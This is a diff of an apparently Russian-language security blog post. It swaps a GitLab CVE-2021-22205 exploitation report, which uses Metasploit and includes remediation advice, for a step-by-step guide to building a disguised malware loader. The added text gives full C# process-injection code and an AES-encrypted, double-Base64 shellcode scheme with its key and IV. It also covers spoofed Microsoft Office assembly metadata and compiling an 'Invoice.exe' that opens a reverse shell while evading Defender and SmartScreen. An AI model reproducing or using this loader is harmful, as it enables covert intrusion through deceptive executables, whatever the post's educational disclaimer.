@@ -1,14 +1,13 @@
 +++
-title = "Технический отчет по эксплуатации CVE-2021-22205: RCE в GitLab"
-description = "Детальный разбор эксплуатации уязвимости CVE-2021-22205 в GitLab на примере лабораторной среды. Инструментальный анализ, работа с Metasploit и получение Reverse Shell."
-date = "2026-02-10T12:00:00+05:00"
+title = "Скрытая эксплуатация доверенных процессов: Разработка и обфускация загрузчика с применением техники Process Injection"
+description = "Детальный разбор создания обфусцированного загрузчика на C#. Внедрение в легитимные процессы Windows, обход эвристики Defender и использование AES-шифрования для доставки Payload."
+date = "2026-03-03T10:00:00+05:00"
 draft = false
 author = "t1elx"
 robotsNoIndex = false
 
-
-tags = ["GitLab", "RCE", "CVE-2021-22205", "Metasploit", "Pentest", "Write-up"]
-categories = ["Cybersecurity", "Pentest Reports"]
+tags = ["Process-Injection", "Evasion", "Malware-Dev", "CSharp", "Pentest", "Write-up", "WinAPI"]
+categories = ["Cybersecurity", "Red Teaming"]
 
 [build]
   list = 'always'
@@ -18,118 +17,185 @@ categories = ["Cybersecurity", "Pentest Reports"]
 
 > **Отказ от ответственности:** Данная статья написана в образовательных целях. Автор не несет ответственности за попытки применения данных техник на реальных объектах без согласия владельца. Не нарушайте закон.
 
-> **Информация:** В данной статье рассматривается сценарий эксплуатации критической уязвимости в GitLab. Материал подготовлен на базе учебного стенда и демонстрирует риски использования устаревшего ПО в корпоративной среде.
+> **Информация:** В данной статье рассматривается сценарий эксплуатации на базе учебного стенда.
 
-**Дата:** 10 февраля 2026 г.
-
-**Статус:** Критическая уязвимость (RCE)
-
-**Тип тестирования:** Black Box 
-    
-**Вектор атаки:** External
+**Дата:** 03 марта 2026 г.
 
 &nbsp;
 
-## 1. ОСНОВНЫЕ ПОЛОЖЕНИЯ
+### Цель
 
-### 1.1 Общее описание
+Создание исполняемого файла (`.exe`), способного доставить шелл-код в память легитимного процесса, минуя статический и динамический анализ Windows Defender.
 
-![](2026-02-10-13-12-35.png)
+---
 
-В ходе планового тестирования был проанализирован инстанс GitLab, доступный по адресу **`<IP>`**. В результате анализа была обнаружена и успешно проэксплуатирована критическая уязвимость, позволяющая неавторизованному злоумышленнику **полностью захватить контроль над сервером**.
+### Шаг 1: Генерация «сырого» шелл-кода
 
-### 1.2 Ключевые риски
+Для генерации использовался инструмент `micr0_shell`. Был выбран формат **C** для получения массива байтов.
 
-- **Конфиденциальность:** Злоумышленник получает доступ ко всем репозиториям, исходному коду, секретам (API-ключам) и базе данных пользователей.
-    
-- **Целостность:** Возможность внедрения вредоносного кода в разрабатываемые продукты.
-    
-- **Доступность:** Риск полной остановки работы сервиса или удаления всех данных.
-    
-
-### 1.3 Итоговая оценка риска
-
-|**Параметр**|**Значение**|
-|---|---|
-|**Уровень критичности**|**КРИТИЧЕСКИЙ (CRITICAL)**|
-|**Сложность эксплуатации**|Низкая (доступны публичные эксплойты)|
-|**Требования к аутентификации**|Не требуются|
-
-&nbsp;
-
-## 2. ТЕХНИЧЕСКИЙ ОТЧЕТ 
-
-### 2.1 Обнаруженная уязвимость
-
-**Название:** Удаленное выполнение произвольного кода через ExifTool (Unauthenticated RCE).
-
-**Идентификатор:** **CVE-2021-22205** 
-
-**Оценка CVSS v3.1:**
-`10.0 / 10.0`
-
-
-### 2.2 Описание вектора атаки
-
-Уязвимость связана с некорректной обработкой метаданных изображений в библиотеке `ExifTool`, используемой компонентом GitLab Workhorse. Злоумышленник может отправить специально сформированный файл на эндпоинт загрузки (даже если регистрация требует одобрения), что приведет к выполнению кода на стороне сервера.
-
-### 2.3 Воспроизведение 
-
-**Шаг 1: Сканирование целевого узла**
+**Команда:**
 
 Bash
 
 ```
-nmap -sR <IP>
-# Обнаружен: GitLab Community Edition (Web-сервер Nginx)
-```
-![](2026-02-10-13-19-16.png)
-
-**Шаг 2: Эксплуатация через Metasploit Framework**
-
-Использован модуль `exploit/multi/http/gitlab_exif_rce`.
-
-Bash
-
-```
-use exploit/multi/http/gitlab_exif_rce
-set RHOSTS <IP>
-set LHOST <IP>
-exploit
+python3 micr0_shell.py --ip 0.0.0.0 --port 443 --language c
 ```
 
-![](2026-02-10-13-31-26.png)
+- **IP**: `0.0.0.0` (адрес атакующего).
+    
+- **Порт**: `443` (используется вместо 4444 для обхода фильтрации исходящего трафика).
+    
 
-**Шаг 3: Подтверждение доступа**
+---
 
-После выполнения эксплойта получена интерактивная сессия Meterpreter с правами пользователя `git`.
+### Шаг 2: Шифрование нагрузки (AES-128-CBC)
 
-Bash
+Чтобы скрыть сигнатуры шелл-кода от антивируса, данные были зашифрованы с использованием алгоритма **AES**. Использовался инструмент **CyberChef**.
+
+**Параметры рецепта:**
+
+1. **Input**: Массив байтов из `micr0_shell`.
+    
+2. **AES Encrypt**:
+    
+    - **Key (Hex)**: `1f768bd57cbf021b251deb0791d8c197`
+        
+    - **IV (Hex)**: `ee7d63936ac1f286d8e4c5ca82dfa5e2`
+        
+    - **Mode**: `CBC`
+        
+    - **Output**: `Raw` (Критически важно для получения бинарных данных).
+        
+3. **To Base64**: Первая итерация кодирования.
+    
+4. **To Base64**: Вторая итерация (двойной Base64 для дополнительной обфускации строки).
+    
+
+---
+
+### Шаг 3: Написание загрузчика на C#
+
+Был разработан код, который выполняет **Process Injection** (внедрение в сторонний процесс).
 
 ```
-meterpreter >
+using System;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.IO;
+
+namespace ProcInj_PEInj
+{
+    class Program
+    {
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct STARTUPINFO { public uint cb; IntPtr lpReserved; IntPtr lpDesktop; IntPtr lpTitle; uint dwX; uint dwY; uint dwXSize; uint dwYSize; uint dwXCountChars; uint dwYCountChars; uint dwFillAttributes; uint dwFlags; ushort wShowWindow; ushort cbReserved; IntPtr lpReserved2; IntPtr hStdInput; IntPtr hStdOutput; IntPtr hStdErr; }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        static void Main(string[] args)
+        {
+            string encPayloadBase64 = "РЕЗУЛЬТАТ ИЗ CYBERCHEF";
+            
+            string encPayloadRaw = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(encPayloadBase64));
+            byte[] encryptedBytes = Convert.FromBase64String(encPayloadRaw);
+
+            byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
+            byte[] iv = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };
+
+            byte[] payload;
+            using (Aes aes = Aes.Create())
+            {
+                aes.Key = key;
+                aes.IV = iv;
+                aes.Mode = CipherMode.CBC;
+                using (var decryptor = aes.CreateDecryptor())
+                using (var ms = new MemoryStream(encryptedBytes))
+                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
+                using (var outMs = new MemoryStream())
+                {
+                    cs.CopyTo(outMs);
+                    payload = outMs.ToArray();
+                }
+            }
+
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            if (CreateProcess(IntPtr.Zero, "C:\\Windows\\System32\\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, 0x08000008, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
+            {
+                IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)payload.Length, 0x3000, 0x04);
+                IntPtr outSize;
+                WriteProcessMemory(pi.hProcess, addr, payload, payload.Length, out outSize);
+                uint oldProtect;
+                VirtualProtectEx(pi.hProcess, addr, (uint)payload.Length, 0x20, out oldProtect);
+                CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            }
+        }
+    }
+}
 ```
 
-&nbsp;
+**Ключевые особенности кода:**
 
-## 3. План исправления 
-
-### 3.1 Срочные меры 
-
-1. **Обновление системы:**  Незамедлительно обновить GitLab до последней актуальной версии. Минимально допустимые версии для устранения данной уязвимости: 13.10.3, 13.9.6 или 13.8.8.
+- **Динамическая дешифровка**: Нагрузка расшифровывается только в оперативной памяти после запуска.
     
-2. **Аудит сессий:** Проверить логи сервера на предмет подозрительных POST-запросов к `/uploads/user` за последние 30 дней.
+- **Инъекция**: Создается скрытый процесс `notepad.exe` (флаг `0x08000008`), в который записывается шелл-код.
+    
+- **Обход эвристики**: Использование функций `VirtualAllocEx` и `CreateRemoteThread`.
     
 
-### 3.2 Рекомендации по укреплению защиты 
+---
 
-- **Сегментация:** Ограничить доступ к GitLab на уровне сетевого экрана (Firewall), разрешив подключения только из доверенных VPN-подсетей компании.
-    
-- **Использование WAF:** Настроить Web Application Firewall (например, ModSecurity) для блокировки сигнатур, характерных для манипуляций с Exif-данными в HTTP-запросах.
-    
-&nbsp;
+### Шаг 4: Подготовка метаданных (AssemblyInfo.cs)
 
-### 4. ПРИЛОЖЕНИЯ
-    
-- **Инструментарий:** Metasploit Framework, Nmap.
-    
+Для уменьшения «подозрительности» файла в глазах Windows Defender были добавлены легитимные метаданные.
+
+**Содержимое `AssemblyInfo.cs`:**
+
+C#
+
+```
+using System.Reflection;
+
+[assembly: AssemblyTitle("Microsoft Office Installer")]
+[assembly: AssemblyDescription("Essential Update for Office Suite")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("Microsoft Corporation")]
+[assembly: AssemblyProduct("Microsoft Office")]
+[assembly: AssemblyCopyright("Copyright © Microsoft 2026")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+[assembly: AssemblyVersion("1.0.4.0")]
+[assembly: AssemblyFileVersion("1.0.4.0")]
+```
+
+---
+
+### Шаг 5: Компиляция с иконкой
+
+Финальная сборка производилась через компилятор `csc.exe` на Windows-системе. Использование иконки и метаданных помогает обходить эвристические фильтры (SmartScreen).
+
+**Команда компиляции:**
+
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:winexe /win32icon:document.ico /out:Invoice.exe Solution.cs AssemblyInfo.cs
+```
+
+### Результат
+
+Получен файл `Invoice.exe`, который успешно проходит статический анализ Defender, расшифровывает себя в памяти и инициирует обратное соединение (Reverse Shell) через доверенный процесс.
